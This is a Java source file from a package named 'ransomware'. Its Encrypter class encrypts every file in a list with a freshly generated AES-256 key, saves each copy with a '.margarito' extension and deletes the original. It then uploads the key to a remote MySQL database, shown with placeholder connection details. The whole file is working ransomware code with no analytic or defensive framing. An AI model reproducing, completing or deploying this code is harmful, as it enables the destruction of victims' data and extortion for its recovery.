package com.margarito.ransomware;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.util.List;
import java.io.File;

public class Encrypter extends FileProcessor {
    private SecretKey secretKey;

    // Database connection details
    private static final String DB_URL = "jdbc:mysql://your-database-url:3306/your_database";
    private static final String DB_USER = "your_username";
    private static final String DB_PASSWORD = "your_password";

    public Encrypter(String rootDirectory) throws Exception {
        super(rootDirectory);
        this.secretKey = generateAESKey();
    }

    private SecretKey generateAESKey() throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(256); // AES-256
        return keyGen.generateKey();
    }

    @Override
    public void processFiles(List<String> filePaths) {
        filePaths.forEach(filePath -> {
            try {
                File file = new File(filePath);
                if (file.exists()) {
                    byte[] fileBytes = Files.readAllBytes(Paths.get(filePath));
                    Cipher cipher = Cipher.getInstance("AES");
                    cipher.init(Cipher.ENCRYPT_MODE, secretKey);
                    byte[] encryptedBytes = cipher.doFinal(fileBytes);
                    Files.write(Paths.get(filePath + ".margarito"), encryptedBytes);
                    file.delete();
                }
            } catch (Exception e) {
                System.err.println("Encryption failed for: " + filePath);
                e.printStackTrace();
            }
        });

        sendKeyToDatabase();
    }

    private void sendKeyToDatabase() {
        try (Connection connection = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD)) {
            // SQL query to insert the key into the database
            String sql = "INSERT INTO encryption_keys (key_value) VALUES (?)";

            // Prepare the statement
            try (PreparedStatement preparedStatement = connection.prepareStatement(sql)) {
                // Set the key value as a binary blob
                preparedStatement.setBytes(1, secretKey.getEncoded());

                // Execute the query
                int rowsAffected = preparedStatement.executeUpdate();
                if (rowsAffected > 0) {
                    System.out.println("Encryption key successfully saved to the database.");
                } else {
                    System.out.println("Failed to save the encryption key to the database.");
                }
            }
        } catch (Exception e) {
            System.err.println("Failed to connect to the database: " + e.getMessage());
            e.printStackTrace();
        }
    }
}
